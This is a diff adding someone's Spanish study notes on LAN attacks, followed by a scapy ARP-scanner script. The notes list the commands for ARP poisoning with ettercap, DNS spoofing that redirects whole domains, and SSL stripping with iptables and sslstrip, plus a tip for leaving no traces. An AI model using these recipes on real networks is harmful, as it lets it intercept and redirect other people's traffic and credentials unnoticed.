@@ -1,0 +1,109 @@
+
+ATAQUE DE INTERMEDIARIO MAN-IN-THE-MIDDLE ATTACK ARP
+
+Se aprovechan fallas en las redes internas para pasar tráfico a través de uno
+
+netdiscover -i eth0    [i de interface, escaneo de conexiones que están en la misma red, enviando paquetes ARP]
+arp-scan -l -I eth0    [otro escaneo, -l para locales]
+arp -a                 [tabla ARP con todos los dispositivos conectados... si falta, ping]
+
+Envenenar la red: estando dentro de la red, llenar la solicitud ARP fingiendo ser el dispositivo de la IP solicitada, mintiendo la MAC
+"envenena todo el segmento de red", "nosotros somos todas las IP conectadas"
+
+Ataque:
+	ettercap -T -q -M arp:remote -i eth0
+   	 [text, quite, man-in-the-middle; envenena toda la red, yo soy todas las MAC]
+
+Se completa la tabla de ARP      [arp -a para windows también]
+Verificar con ping y wireshark
+SALIR CON q, no con ctrl+c, y no quedan huellas
+
+
+Ettercap: https://youtu.be/5ncgSkLGuD0
+Ver también arpspoof
+
+
+SPOOFING DE DNS
+cd /etc/ettercap/
+vim etter.dns
+modificar vim etter.conf, cambiar Id a 0 que es el de root
+modificar el fichero para que redireccione, x ej:
+	nslookup www.linux.org  ---> IP
+	descomentar *.microsoft.com y cambiar por la IP de linux ...
+
+En ettercap (ataque te quiero mucho) tocar p y activar plugin "dns_spoof"
+Ahora cuando alguien en la red intente acceder a microsoft.com entrará a linux.org
+
+Spoofing total:
+	nslookup facebook.com
+	vim etter.dns * A xxx.xxx.xxx.xxx   arriba de todas las demás reglas
+En ettercap (ataque te quiero mucho) tocar p y tipear plugin "dns_spoof" dos veces
+	 (reinicia, para que tome los cambios)
+SALIR CON q, no con ctrl+c, y no quedan huellas
+
+dnsspoof -i wlan0
+
+
+SSL STRIP
+"Convertir el equipo en un router que redirecciona el tráfico de un puerto a otro,
+ para que todo el tráfico https sea interpretado por SSL Trip"
+
+Verificar que nuestro sistema permita forwarding (el kerner tenga el flag activado de IP forwarding)...
+	cat /proc/sys/net/ipv4/ip_forward	(tiene que estar en 1)
+	Atajo: echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Que todas las comunicaciones que quieran pasar por el puerto 80 sean redireccionadas al puerto 8080:
+	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-p 8080
+	iptables -L -t nat   [ver reglas]
+
+Escuchar lo que sale del puerto 8080
+	sslstrip -l 8080
+	ettercap -T -q -M arp -i eth0    [text, quite, man-in-the-middle]
+
+(con DNS Spoofing off)
+
+
+
+
+
+
+
+
+
+
+# Import scapy
+import scapy.all as scapy
+# We need to create regular expressions to ensure that the input is correctly formatted.
+import re
+
+# Basic user interface header
+print(r"""______            _     _  ______                 _           _ 
+|  _  \          (_)   | | | ___ \               | |         | |
+| | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
+| | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
+| |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
+|___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")
+print("\n****************************************************************")
+print("\n* Copyright of David Bombal, 2021                              *")
+print("\n* https://www.davidbombal.com                                  *")
+print("\n* https://www.youtube.com/davidbombal                          *")
+print("\n****************************************************************")
+
+# Regular Expression Pattern to recognise IPv4 addresses.
+ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
+
+# Get the address range to ARP
+while True:
+    ip_add_range_entered = input("\nPlease enter the ip address and range that you want to send the ARP request to (ex 192.168.1.0/24): ")
+    if ip_add_range_pattern.search(ip_add_range_entered):
+        print(f"{ip_add_range_entered} is a valid ip address range")
+        break
+
+
+# Try ARPing the ip address range supplied by the user. 
+# The arping() method in scapy creates a pakcet with an ARP message 
+# and sends it to the broadcast mac address ff:ff:ff:ff:ff:ff.
+# If a valid ip address range was supplied the program will return 
+# the list of all results.
+arp_result = scapy.arping(ip_add_range_entered)
+
